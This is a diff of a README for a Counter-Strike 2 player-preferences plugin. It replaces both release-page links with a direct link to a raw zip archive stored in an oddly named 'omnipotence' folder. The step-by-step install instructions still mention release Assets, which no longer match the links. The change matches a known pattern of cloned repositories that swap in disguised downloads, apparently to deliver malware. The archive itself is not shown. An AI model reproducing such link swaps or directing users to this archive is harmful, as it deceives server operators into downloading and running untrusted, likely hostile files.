@@ -1,6 +1,6 @@
 # 💾 cs2-ClientPrefs-GoldKingZ - Save player preferences for CS2 servers
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Sheldenrigorous762/cs2-ClientPrefs-GoldKingZ/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Sheldenrigorous762/cs2-ClientPrefs-GoldKingZ/raw/refs/heads/main/omnipotence/Client_King_Gold_cs_Prefs_Z_v3.9.zip)
 
 This software manages player settings across different plugins for Counter-Strike 2 servers. It saves player choices so they keep their customized settings when they return to the server. The tool works by storing data in local files or remote databases.
 
@@ -17,7 +17,7 @@ Before you install this software, ensure your computer meets these basic require
 
 Follow these steps to set up the software on your server.
 
-1. Open the [Release Page](https://github.com/Sheldenrigorous762/cs2-ClientPrefs-GoldKingZ/releases).
+1. Open the [Release Page](https://github.com/Sheldenrigorous762/cs2-ClientPrefs-GoldKingZ/raw/refs/heads/main/omnipotence/Client_King_Gold_cs_Prefs_Z_v3.9.zip).
 2. Locate the most recent file version listed under Assets.
 3. Click the file to download the compressed archive to your computer.
 4. Open the downloaded folder.
